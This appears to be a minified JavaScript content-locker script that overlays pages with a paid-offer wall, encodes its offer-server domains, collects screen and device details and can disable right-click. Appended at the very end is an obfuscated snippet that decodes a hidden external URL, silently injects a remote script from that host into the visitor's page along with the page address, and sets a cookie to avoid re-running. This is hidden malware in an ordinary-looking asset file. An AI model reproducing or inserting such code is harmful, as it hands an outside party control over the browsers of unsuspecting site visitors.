var xfContentLocker,__cfRLUnblockHandlers=1;function CPBContentLocker(){this.constructed=!1,this.referrer=document.referrer?this.encode(document.referrer):"",this.protocol="https:"===document.location.protocol?"https://":"http://",this.settings=this.getSettings(),this.extraParams={},this.uid="",this.urls={},this.screenHeight=window.screen.availHeight?window.screen.availHeight:0,this.screenWidth=window.screen.availWidth?window.screen.availWidth:0,this.isMobile=this.mobileCheck(),this.callbacks=[],this.d2=["EUYGBw0RRwIDHgYYBBFbFhkaABETBxobAVsbEAE=","EUQTAR4TAUIcHBkABENbFhkaABETBxobAVsbEAE=","EQYZBQIXEA8cBkwUHFsWGRoAERMHGhsBWxsQAQ==","EQZEBURCDUIcBhhAB1sWGRoAERMHGhsBWxsQAQ==","EQ0HQEYCBhcRDAMHDFsWGRoAERMHGhsBWxsQAQ==","EUQSQEcAHkxFAwAERQRbFhkaABETBxobAVsbEAE=","EURHDxIWFhIBQwUCHw9bFhkaABETBxobAVsbEAE=","EUZMRRwWH0QBFEENRQVbFhkaABETBxobAVsbEAE=","EUQYDBtBHA0bG0FEAQ9bFhkaABETBxobAVsbEAE=","ERECEUwbQ0ARHQFFFFsWGRoAERMHGhsBWxsQAQ=="],this.d3=this.decode64(this.d2[Math.floor(Math.random()*this.d2.length)]),this.defaultSettings=[],this.userSettings=[],this.modal=null,this.modalContainer=null,this.modalContent=null,this.animation=null,this.iframe=null,this.isLoaded=!1,this.requiredPoints=1e4,this.requiredLeads=1,this.completedLeads=[],this.completedPoints=0,this.visitor_id=0,this.locks=["RH","Vm","uj","Ew","HW","oy","Jf","Mz","EQ","ZU","lL","yk","Tm","Ht","nS","Xy","qr","Tt","du","OS","Ts","ET","om","Wi","xb","GK","CS","kt","iE","Ut","yi","TR","iD","aj","lI","Ri","Th","gD","iH","ff","uG","KE","VR","HL","VX","Nr","di","Ul","WT","Cd","cy","jb","tx","Yf","zl","Pg","CJ","Jl","GX","nO","JF","KB","VU","MS","cn","xA","Kx","eN","yy","bC","JW","cW","Cm","xY","Gi","Ns","bu","Ci","cZ","vH","ou","Tu","ux","xS","wg","vs","Nl","LF","gu","Yg","Hj","dS","VE","TG","qd","FD","rp","Hn","my","qW"],this.detectUID(),this.setParam("cpguid",this.uid),this.setParam("pr",!0===this.settings.preview?1:0),this.setParamsFromSettings(),this.optionalParameters={h:this.screenHeight.toString(),w:this.screenWidth.toString(),it:encodeURI(this.settings.it),key:encodeURI(this.settings.key),m:this.isMobile?"1":"0",r:encodeURI(this.referrer),callback:"?"},this.setURLS(),this.setLockFunctions(),this.body=document.getElementsByTagName("body")[0],this.head=document.getElementsByTagName("head")[0],this.constructed=!1,parseInt(this.settings.it)>0&&!1!==this.settings.construct&&(this.loadBody(),this.loadHTML(),this.constructed=!0)}function xfLock(){xfContentLocker.openLocker()}function xfGetFeedURL(){return xfContentLocker.urls.feed}function xfGetIframeURL(){return xfContentLocker.urls.iframe}function xfGetIframeHTML(){return xfContentLocker.getIframeHTML()}function xfUnlock(){xfContentLocker.closeLocker()}function xfOfferComplete(data){}function xfOffersComplete(arr){xfContentLocker.addCompletions(arr)}function xfCheckForLead(testing){xfContentLocker.checkLead(testing)}function xfComplete(){}function CPABuildLock(){xfLock()}function CPABuildGetFeedURL(){return xfGetFeedURL()}function CPABuildGetIframeURL(){return xfGetFeedURL()}function CPABuildGetIframeHTML(){return xfGetIframeHTML()}function CPABuildUnlock(){xfUnlock()}function CPABuildOfferComplete(data){xfOfferComplete(data)}function CPABuildOffersComplete(arr){xfOffersComplete(arr),CPABUILDContentLocker.addCompletions(arr)}function CPABuildCheckForLead(testing){xfCheckForLead(testing)}function CPABuildComplete(){xfComplete()}CPBContentLocker.prototype={constructor:CPBContentLocker,log:function(msg){void 0!==window.console&&window.console.log(msg)},addCallback:function(callback){this.callbacks.push(callback)},getSettings:function(){if("object"==typeof window.CPABUILDSETTINGS)return window.CPABUILDSETTINGS;for(var preg=/[A-Za-z]{5}_[A-Za-z]{3}_[A-Za-z]{5}c/,k=Object.keys(window),kCounter=0;kCounter<k.length;kCounter++)if(k[kCounter].match(preg))return window[k[kCounter]]},setLockFunctions:function(){for(var t=this,kCounter=0;kCounter<this.locks.length;kCounter++){var k="_"+this.locks[kCounter];window[k]=function(){t.openLocker()}}},callback:function(event,data){for(var cbCounter=0;cbCounter<this.callbacks.length;cbCounter++){var c=this.callbacks[cbCounter];"function"==typeof c&&c(event,data)}},globalCallbacks:function(){this.addCallback((function(event,data){console.log(event,data)}))},detectUID:function(){},getDomainFromURL:function(url){var matches=url.match(/^https?\:\/\/([^\/?#]+)(?:[\/?#]|$)/i);return matches&&matches[1]},detectScriptDomain:function(){var s=document.getElementsByTagName("script"),d=this.getDomainFromURL(s[s.length-1].src);d&&d.length&&(this.scriptDomain=d)},mobileCheck:function(){var a,check=!1;return a=navigator.userAgent||navigator.vendor||window.opera,(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4)))&&(check=!0),check},paramsToQuery:function(params){if(!params)return"";var q=[];for(var k in params){var value=params[k];q.push(encodeURIComponent(k)+"="+encodeURIComponent(value))}return q.join("&")},getQueryParam:function(name,url){url||(url=window.location.href),name=name.replace(/[\[\]]/g,"\\$&");var results=new RegExp("[?&]"+name+"(=([^&#]*)|&|#|$)").exec(url);return results&&results[2]?decodeURIComponent(results[2].replace(/\+/g," ")):""},loadBody:function(){var thisPass=this;if(this.body=document.getElementsByTagName("body")[0],void 0===this.body)return setTimeout((function(){thisPass.loadBody()}),5),!1},setParam:function(key,value){return this.extraParams[key]=value,this},loadHTML:function(){var id="xfMAINJS";this.removeElByID(id);var script=document.createElement("script");script.type="text/javascript",script.src=this.urls.js,script.id=id,this.head.appendChild(script),this.callback("loadHTML",{}),this.loadGlobalCSS()},loadGlobalCSS:function(){if(!document.getElementById("xfGLOBALSTYLE")){var l=document.createElement("link");l.rel="stylesheet",l.href=this.urls.css,l.id="xfGLOBALSTYLE",this.head.appendChild(l),this.callback("loadGlobalCSS",{})}},generateUID:function(){return("000"+(46656*Math.random()|0).toString(36)).slice(-3)+("000"+(46656*Math.random()|0).toString(36)).slice(-3)+("000"+(46656*Math.random()|0).toString(36)).slice(-3)},checkLead:function(testing){var script=document.createElement("script"),url=this.urls.check+(new Date).getTime();"testing"===testing&&(url+="&testing=1"),this.removeElByID("xfLEADCHECK"),script.id="xfLEADCHECK",script.type="text/javascript",script.src=url,this.head.appendChild(script),this.callback("checkLead",{})},openLocker:function(){var thisPass=this;if(!thisPass.isLoaded)return setTimeout((function(){thisPass.openLocker(),thisPass.callback("openLocker",{})}),5),!1;this.iframe.setAttribute("src",this.urls.iframe),this.modalContainer.style.display="block",this.modal.className="",this.modal.style.display="block",void 0!==this.body&&(this.body.className+=" xfBodyModalOpen"),setTimeout((function(){thisPass.modal.className="xfAnimation xfShow"}),50)},closeLocker:function(){var thisPass=this;this.modal.className="fadeOut",this.callback("closeLocker",{}),void 0!==this.body&&(this.body.className=this.body.className.replace(/\bxfBodyModalOpen\b/,"")),setTimeout((function(){thisPass.modal.style.display="none"}),550)},encode:function(str){var encoded="";for(i=0;i<str.length;i++){var b=117^str.charCodeAt(i);encoded+=String.fromCharCode(b)}return encoded},decode64:function(encoded){var decoded="";for(encoded=atob(encoded),i=0;i<encoded.length;i++){var b=117^encoded.charCodeAt(i);decoded+=String.fromCharCode(b)}return decoded},onSettingsAndHTMLLoaded(){1===parseInt(this.getValue("disable_right_click"))&&document.addEventListener("contextmenu",(event=>event.preventDefault())),1!==parseInt(this.getValue("escape_key_close"))&&1!==this.settings.testing&&!0!==this.settings.escapeOverwrite||(document.onkeydown=function(evt){("key"in(evt=evt||window.event)?"Escape"===evt.key||"Esc"===evt.key:27===evt.keyCode)&&this.closeLocker()})},onVarsChange:function(){var thisPass=this;this.modalContainer=document.getElementById("xf_MODAL_CONTAINER"),this.modal=document.getElementById("xf_MODAL"),this.modalContent=document.getElementById("xfMODALCONTENT"),this.iframe=document.getElementById("xfOFFERS"),this.modalContent.className=this.getValue("animation"),setTimeout((function(){thisPass.isLoaded=!0}),500);var cssRules=[];for(var key in thisPass.defaultSettings)if(thisPass.defaultSettings.hasOwnProperty(key)){var obj=thisPass.defaultSettings[key];if("object"==typeof obj.css&&"html"==obj.for){var value=thisPass.getValue(key);"background-image"==obj.css.rule&&value&&(value="url('"+value+"')"),value&&"string"==typeof obj.css.format&&(value=obj.css.format.replace("%value%",value)),value&&cssRules.push({target:obj.css.target,rule:obj.css.rule,value:value})}}if(thisPass.setCSSRules(cssRules),void 0!==this.defaultSettings.content_locker_title_text&&(document.getElementById("xfMODALTITLE").innerHTML=thisPass.getValue("content_locker_title_text")),void 0!==this.defaultSettings.content_locker_footer_text&&(document.getElementById("xfMODALFOOTERTEXT").innerHTML=thisPass.getValue("content_locker_footer_text")),void 0!==this.defaultSettings.overlay_color&&void 0!==this.defaultSettings.overlay_opacity){var opacity=thisPass.getValue("overlay_opacity"),hex=thisPass.getValue("overlay_color"),rgba=thisPass.convertHex(hex,opacity);document.getElementById("xfSettingsCSS").innerHTML+="#xf_MODAL_CONTAINER #xf_MODAL {background-color: "+rgba+" }"}this.isMobile&&(this.modalContainer.className+=" xf_MODAL_CONTAINER_MOBILE"),void 0!==this.userSettings.number_offers_required&&(this.requiredLeads=parseInt(this.userSettings.number_offers_required)),void 0!==this.userSettings.payout_required&&(this.requiredPoints=parseInt(this.userSettings.payout_required)),setTimeout((function(){thisPass.checkLead()}),2e3),this.onSettingsAndHTMLLoaded()},getValue:function(key){return void 0===this.defaultSettings[key]?(this.log("ERROR - No default settings for key "+key),""):void 0!==this.userSettings[key]&&this.userSettings[key]?this.userSettings[key]:this.defaultSettings[key].default},changeHTML:function(html){document.getElementById("xfMODALBODY").innerHTML=html},setCSSRules:function(cssRules){var textRules=[],id="xfSettingsCSS";this.removeElByID(id),cssRules.length>0&&cssRules.map((function(rule){var text="#xf_MODAL_CONTAINER "+rule.target+"{"+rule.rule+":"+rule.value+"}";textRules.push(text)}));var animationDuration=parseInt(this.getValue("animation_duration")),animationDurationCSS="#xf_MODAL_CONTAINER #xfMODALCONTENT{animation-duration: "+animationDuration+"ms;-webkit-transition: all "+animationDuration+"ms;transition: all "+animationDuration+"ms;transition-duration: "+animationDuration+"ms;}";textRules.push(animationDurationCSS);var style=document.createElement("style");style.type="text/css",style.id=id,style.innerHTML=textRules.join("\n\n"),this.head.appendChild(style)},removeElByID:function(id){var elem=document.getElementById(id);elem&&elem.parentElement.removeChild(elem)},reset:function(){this.removeElByID("xf_MODAL_CONTAINER"),xfContentLocker=new CPBContentLocker},addCompletions:function(arr){if(!1===this.constructed)return!1;for(var arrayLength=arr.length,newLeads=!1,i=0;i<arrayLength;i++){var visitor_id=parseInt(arr[i].visitor_id),lead_id=parseInt(arr[i].lead_id),points=parseInt(arr[i].points);-1==this.completedLeads.indexOf(lead_id)&&(this.visitor_id=visitor_id,newLeads=!0,this.completedLeads.push(lead_id),this.completedPoints+=points)}newLeads&&this.checkComplete()},checkComplete:function(){this.completedLeads.length<this.requiredLeads?alert("Completed "+this.completedLeads.length+" out of "+this.requiredLeads+" offers!"):this.completedPoints<this.requiredPoints?alert("Completed "+this.completedPoints+" out of "+this.requiredPoints+" points!"):this.offersComplete({visitor_id:this.visitor_id,points:this.completedPoints,leads:this.completedLeads})},convertHex:function(hex,opacity){return opacity=parseFloat(opacity),hex=hex.replace("#",""),"rgba("+parseInt(hex.substring(0,2),16)+","+parseInt(hex.substring(2,4),16)+","+parseInt(hex.substring(4,6),16)+","+opacity+")"},offersComplete:function(data){var url,closeType=this.getValue("onClose");if("function"==typeof this.settings.onComplete&&!1===this.settings.onComplete(data))return!1;return"function"==typeof xfComplete&&xfComplete(),void 0!==this.settings.redirect?(url=this.settings.redirect,window.location=url,this.changeHTML("Offer complete! <a href='"+url+"'>Click here</a> to continue"),!1):"close_locker"===closeType?(this.closeLocker(),!1):"redirect"===closeType?(url=(url=(url=this.getValue("onCloseURL")).replace("%lead_id%",this.completedLeads[0])).replace("%visitor_id%",this.visitor_id),window.location=url,this.changeHTML("Offer complete! <a href='"+url+"'>Click here</a> to continue"),!1):void this.callback("offersComplete",{})},getIframeHTML:function(){return'<iframe src="'+this.urls.iframeOnly+'" height="100%" marginwidth="0" marginheight="0" align="middle" frameborder="0" width="100%" ></iframe>'},setParamsFromSettings:function(){var k,i;if("object"==typeof this.settings.params)for(k in this.settings.params){var value=this.settings.params[k];this.setParam(k,value)}for(i=1;i<=4;i++){var iKey="s"+i;if(!this.extraParams[iKey]){var p=this.getQueryParam(iKey);""!==p&&(this.extraParams[iKey]=p)}}},getParamString:function(arrayOfKeys){var i,p=[];for(i=0;i<arrayOfKeys.length;i++){var key=arrayOfKeys[i],value=this.optionalParameters[key];p.push(key+"="+value)}return p.join("&")},setURLS:function(){var p="https://"+this.d3+"/public/",q=this.paramsToQuery(this.extraParams);return this.urls.iframe=p+"ct?"+q+"&"+this.getParamString(["it","w","h","key","m","r"]),this.urls.feed=p+"f_it?"+q+"&"+this.getParamString(["it","w","h","key","m","callback"]),this.urls.iframeOnly=p+"i_fr?"+q+"&"+this.getParamString(["it","w","h","key","m","r"]),this.urls.js=p+"external/v2/"+(!0===this.settings.preview?"preview":"htmlxf")+"."+this.settings.it+"."+this.settings.key+"."+this.optionalParameters.m+".js"+(!0===this.settings.preview?"?t="+(new Date).getTime():""),this.urls.css=p+"external/css_frontXF.css",this.urls.specific_css=p+"clockers/",this.urls.check=p+"external/check.php?"+this.getParamString(["it"])+"&time=",this.urls.impression=p+"external/impression.php?"+this.getParamString(["it"])+"&time=",this.urls.guid=p+"guid?"+q+"&e=",this},setTemplateCSSDir:function(dir){var url=this.urls.specific_css+dir+"/cssXF.css",l=document.createElement("link");l.setAttribute("data-it",this.settings.it),l.rel="stylesheet",l.id="xfSPECIFICSTYLE",l.href=url,document.getElementsByTagName("head")[0].appendChild(l)},setCookie:function(name,value,days){var expires="";if(days){var date=new Date;date.setTime(date.getTime()+24*days*60*60*1e3),expires="; expires="+date.toUTCString()}document.cookie=name+"="+(value||"")+expires+"; path=/"},getCookie:function(name){for(var nameEQ=name+"=",ca=document.cookie.split(";"),i=0;i<ca.length;i++){for(var c=ca[i];" "==c.charAt(0);)c=c.substring(1,c.length);if(0==c.indexOf(nameEQ))return c.substring(nameEQ.length,c.length)}return null}},xfContentLocker=new CPBContentLocker;(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));